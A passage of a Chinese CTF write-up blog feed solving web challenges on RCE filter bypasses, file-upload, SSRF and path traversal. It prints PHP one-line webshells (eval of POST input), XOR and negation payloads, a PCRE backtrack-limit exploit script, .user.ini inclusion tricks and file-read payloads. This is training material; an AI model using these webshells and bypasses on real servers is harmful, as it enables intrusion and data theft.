class="hljs-string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蔡总说：注意审题！！！&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现没有过滤<code>~</code>，所以可以使用取反过滤</p><p><strong>0x02</strong></p><p>直接使用php编写payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(~&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;system&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(~&quot;</span>;<br><span class="hljs-comment">// echo &quot;\n&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;cat /f*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;);&quot;</span>;<br><br><br></code></pre></td></tr></table></figure><blockquote><p>(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%D0%99%D5);</p></blockquote><h1 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1><p><strong>0x00</strong></p><p>这道题主要是使用知识点有</p><ol><li><p>tee命令</p><blockquote><p>从标准输入读取数据并重定向到标准输出和文件。</p></blockquote></li><li><p>exec()</p><blockquote><p>php 的这个函数不会输出到页面，我们需要利用tee读取文件内容</p></blockquote></li><li><p>转义字符</p></li></ol><p><strong>0x01</strong></p><p>要绕过这个必须使用转义字符，但是这个没有发生转义，所以可以直接运行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140535072.png" alt="image-20240109140535072"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140543624.png" alt="image-20240109140543624"></p><p><strong>0x02</strong></p><p>接着读取flllllaaaaaaggggggg文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140656434.png" alt="image-20240109140656434"></p><p>因为过滤了la所以这这里使用转义</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240109140731254.png" alt="image-20240109140731254"></p><h1 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h1><p>0x00</p><p>这道题挺好玩的</p><p>使用的知识点：</p><ol><li>base64转图片</li></ol><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125175304677.png" alt="image-20240125175304677"></p><p>访问index，发现自带了rce环境，直接连接</p><p>0x02</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125175337730.png" alt="image-20240125175337730"></p><p>发现一个可疑的文件</p><p>有点像base64</p><p>尝试base64转图片</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125175455096.png" alt="image-20240125175455096"></p><h1 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h1><p>0x00</p><p>收获挺多</p><p>知识点</p><ol><li>PCRE回溯次数限制绕过。</li></ol><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131210139159.png" alt="image-20240131210139159"></p><p>直接给出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;check.php&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;letter&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$txw4ever</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;letter&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="hljs-variable">$txw4ever</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再加把油喔&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$command</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$txw4ever</span>,<span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-title function_ invoke__">checkdata</span>(<span class="hljs-variable">$command</span>);<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$command</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>正则匹配绕过</p><blockquote><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit默认<strong>1000000</strong>，超过1000000不会返回1或0而是false即超过限制即可。</p></blockquote><p>所以我们直接超过限制就可以绕过成功</p><p>0x02</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28550/&#x27;</span><br>payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;,&quot;+&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">1000000</span> + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>res = requests.post(url=url, data=&#123;<span class="hljs-string">&quot;letter&quot;</span>: payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>其中为了绕过check_data</p><p>我们使用&lt;?&#x3D;?&gt;的方式执行，然后成功的绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131210733362.png" alt="image-20240131210733362"></p><h1 id="HUBUCTF-2022-新生赛-HowToGetShell"><a href="#HUBUCTF-2022-新生赛-HowToGetShell" class="headerlink" title="[HUBUCTF 2022 新生赛]HowToGetShell"></a>[HUBUCTF 2022 新生赛]HowToGetShell</h1><p>0x00</p><p>知识点</p><ol><li><p>无字母rce</p><p>异或</p><p>取反</p></li></ol><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240201135453053.png" alt="image-20240201135453053"></p><p>发现这个，是无字母的rce</p><p>0x02</p><p>使用异或的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">valid = <span class="hljs-string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br><br>answer = <span class="hljs-string">&quot;phpinfo&quot;</span><br><br>s1=<span class="hljs-string">&quot;&quot;</span><br>s2=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> answer:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> valid:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> valid:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-built_in">ord</span>(j) == <span class="hljs-built_in">ord</span>(c):<br>                <span class="hljs-built_in">print</span>(i, j)<br>                s1 += i<br>                s2 += j<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span>    <br>        <span class="hljs-keyword">break</span> <br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No answer&quot;</span>)<br><br><span class="hljs-built_in">print</span>(s1)<br><span class="hljs-built_in">print</span>(s2)<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240201135742653.png" alt="image-20240201135742653"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">mess</span>=<span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;0302181&quot;</span>^<span class="hljs-string">&quot;@[@[_^^&quot;</span><span class="hljs-comment">;$_();</span><br></code></pre></td></tr></table></figure><p>根据提示，flag就在phpinfo()里面</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload_file</title>
    <link href="/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/upload-file/"/>
    <url>/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/upload-file/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p><strong>0x00 考点</strong></p><ol><li>后缀绕过</li><li>Content-Type</li><li><code>&lt;?</code>绕过</li></ol><p><strong>0x01</strong></p><p>我先尝试直接上传php文件之后</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201151743522.png" alt="image-20231201151743522"></p><p><strong>0x02</strong></p><p>修改Content-Type</p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201151831483.png" alt="image-20231201151831483"></p><p>说明已经通过了一个测试点了</p><p>但是这里他说我们上传的是php，说明他检测到了我们的后缀</p><p><strong>0x04</strong></p><p>尝试修改文件名，修改了很多都不行</p><p>我看了其他师傅的wp发现这个地方需要上传<code>phtml</code></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201152127655.png" alt="image-20231201152127655"></p><p>他这里开始了内容检查，我们上传不带<code>&lt;?</code></p><p>也就是使用php+html形式</p><p><strong>0x05</strong></p><p>绕过<code>&lt;?</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+html">GIF89a?<br>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[value])&lt;/script<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201152622012.png" alt="image-20231201152622012"></p><p><strong>0x06</strong></p><p>然后就是连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201153024703.png" alt="image-20231201153024703"></p><p>测试出路径为&#x2F;upload</p><h1 id="攻防世界-easyupload"><a href="#攻防世界-easyupload" class="headerlink" title="[攻防世界]easyupload"></a>[攻防世界]easyupload</h1><p><strong>0x00</strong>  前菜</p><p>这道题挺有趣的，首先</p><p>可以尝试上传文件，这个是文件内容的检测，所以需要将一句话木马变成下面这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>phP <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我以为游戏结束了，没想到，这个文件不能访问</p><p><strong>0x01</strong>  .htaccess &amp;&amp; .user.ini</p><blockquote><p>.htaccess 这个是apache的配置文件，可以解析图片为php</p><p>.user.ini 与htaccess 类似，但是用的会普遍一点</p></blockquote><p>这里上传**.htaccess** 不行，所以上传.user.ini试试</p><blockquote><p>auto_prepend_file &#x3D; 1.png</p></blockquote><p>这个就是说，与.user.ini同一个目录下的文件都会包含1.png文件</p><p>如果我们在png里面放置木马就会执行这个木马</p><p>那就直接上传.user.ini文件，然后再上传1.png文件</p><p><strong>0x02</strong>  重要</p><p>最重要的是，当前目录之下必须要有php文件，因为没有文件的话，就不能执行1.png</p><p>注意连接的时候也是访问，当前目录的php文件，因为文件本生还是不具有执行权限</p><h1 id="SWPUCTF-2021-新生赛-easyupload1-0"><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h1><p><strong>0x00 有坑</strong></p><p>这道题的话，比较简单</p><p><strong>0x01  找flag</strong></p><p>连接蚁剑可以很块找到以一个假的flag，但是可以phpinfo()一下</p><p>就可以得到答案了，写这个原因是记住phpinfo()</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/SSRF/"/>
    <url>/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1><p><strong>0x01</strong></p><p>这道题的思路比较简单</p><p>就是使用ssrf访问文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093853864.png" alt="image-20231130093853864"></p><p>给了一个接口，那么就直接访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093925060.png" alt="image-20231130093925060"></p><p>跟着他走</p><blockquote><p>file:&#x2F;&#x2F;&#x2F;&#x2F;fl4g</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094012524.png" alt="image-20231130094012524"></p><p>访问它指定的路径</p><p>出现了</p><blockquote><p>file_get_contents</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094113614.png" alt="image-20231130094113614"></p><p><strong>0x02</strong></p><p>通过这个函数，我们可以直接访问文件</p><p>他又说了文件在<code>flag</code>，所以就直接访问flag</p><p>建议直接尝试比较长的路径</p><blockquote><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094245225.png" alt="image-20231130094245225"></p><h1 id="HNCTF-2022-WEEK2-ez-ssrf已解决"><a href="#HNCTF-2022-WEEK2-ez-ssrf已解决" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf已解决"></a>[HNCTF 2022 WEEK2]ez_ssrf已解决</h1><p>[<a href="https://www.nssctf.cn/problem/2949">HNCTF 2022 WEEK2]ez_ssrf | NSSCTF</a></p><p><strong>0x00</strong></p><p>访问他给的地址，然后发现这个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130095243554.png" alt="image-20231130095243554"></p><p>出现了</p><blockquote><p> fsockopen()</p></blockquote><p>那就构造数据发送</p><p><strong>0x01</strong></p><blockquote><p>&#x2F;index.php?host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo&#x3D;</p></blockquote><p>data</p><blockquote><p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1<br>Connection: Close</p></blockquote><p>得到flag</p><p>这里就相当于是伪造了一个请求，请求了服务端，但是这个host和port不是很理解</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130095633444.png" alt="image-20231130095633444"></p><h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>这道题需要代码审计</p><p>访问，出现了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>       <span class="hljs-variable">$http_x_headers</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>       <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>   &#125;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<span class="hljs-comment">// 以上的只是为了告诉我们ip地址，也就是下面加密需要用到的东西</span><br><br>   <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<span class="hljs-comment">//这个是加密路径，相当于url文件访问路径，有了上面的ip就可以计算出这个值</span><br>   @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//创建目录</span><br>   @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//将当前php的目录改为这个</span><br><br>   <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;GET &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>   <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>   <span class="hljs-variable">$dir</span>  = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<br>   @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>   @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$dir</span>);<br>   @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>   <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p><strong>0x00</strong></p><p>首先先md5找到对应的路径</p><blockquote><p>786c0b7e11c1e9322763fcc8090ef181</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160232238.png" alt="image-20231130160232238"></p><p><strong>0x01</strong></p><p>创建一个目录</p><blockquote><p>?url&#x3D;&#x2F;&amp;filename&#x3D;temp</p></blockquote><p>访问</p><blockquote><p><a href="http://d9768014-7cfd-42d6-841e-07f9b9e5dc90.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/temp">http://d9768014-7cfd-42d6-841e-07f9b9e5dc90.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/temp</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160609970.png" alt="image-20231130160609970"></p><p>出现了一些路径</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160640457.png" alt="image-20231130160640457"></p><p>有一个readfalg，这个是一个程序，所以我们想办法运行，并且将将运行的数据存放到我们的文件里面</p><p>使用bash -c &#x2F;readflag是使用bash运行程序</p><blockquote><p>&#x2F;?url&#x3D;file:bash -c &#x2F;readflag&amp; filename&#x3D;bash -c &#x2F;readflag</p><p>&#x2F;?url&#x3D;bash -c &#x2F;readflag &amp; filename&#x3D;123</p></blockquote><p>然后访问123</p><blockquote><p><a href="http://1e99b289-a06d-43fe-aa18-d5367c10e0d9.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/123">http://1e99b289-a06d-43fe-aa18-d5367c10e0d9.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/123</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130165650011.png" alt="image-20231130165650011"></p><h1 id="GKCTF-2020-cve版签到"><a href="#GKCTF-2020-cve版签到" class="headerlink" title="[GKCTF 2020]cve版签到"></a>[GKCTF 2020]cve版签到</h1><p>0x00</p><p>抓包抓包抓包</p><p>0x01</p><p>首先查看源码，对url进行测试，发现没有用</p><p>然后抓包，发现端倪</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240123115552010.png" alt="image-20240123115552010"></p><p>0x02  构造payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.123</span>%<span class="hljs-number">00</span>ctfhub.com<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络基础</title>
    <link href="/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><h2 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h2><p><strong>0x00 基础知识，记录一下</strong></p><p>可以通过名字发现这个是关于http的ctf</p><p><strong>0x01 browser</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240104212839903.png" alt="image-20240104212839903"></p><p>这个是说，使用浏览器</p><p>闹我们直接修改字段</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240104212913787.png" alt="image-20240104212913787"></p><p><strong>0x02  后面的步骤需要抓包</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240104212958061.png" alt="image-20240104212958061"></p><p>修改了User-Agent的结果</p><p><strong>0x03 假装是回环地址访问</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240104213259258.png" alt="image-20240104213259258"></p><p><img 